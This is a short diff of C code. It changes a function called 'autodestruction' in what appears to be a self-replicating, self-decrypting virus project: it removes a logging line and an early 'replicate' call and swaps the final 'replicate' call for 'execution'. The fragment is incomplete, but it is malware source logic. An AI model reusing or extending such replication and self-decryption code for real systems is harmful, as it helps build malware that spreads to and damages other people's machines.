@@ -8,12 +8,6 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 {
 //	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
 
-#if LOGGER
-	MID_LOGGER("autodestruction:\t");
-#endif
-
-	replicate(host, keychain, context);
-
 	char *entry;
 	const size_t size = (void *)autodestruction - (void *)init;
 	char buf[size];
@@ -29,5 +23,5 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 	keychain->key[LEFT] = 0xdead;
 	keychain->key[RIGHT] = 0xbeef;
 
-	replicate(host, keychain, context);
+	execution(host, keychain, context);
 }
